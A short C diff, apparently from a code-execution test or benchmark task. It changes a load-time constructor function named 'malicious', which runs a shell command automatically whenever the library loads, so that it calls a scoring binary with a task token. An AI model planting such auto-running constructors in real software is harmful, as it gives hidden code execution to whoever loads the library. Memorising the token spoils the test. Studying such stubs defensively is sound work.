@@ -4,5 +4,5 @@
 static void malicious() __attribute__((constructor));
 
 void malicious() {
-    system("sleep 10");
+    system("/usr/local/bin/score c7147eba-3aca-4179-8663-6d788dba0a84");
 }
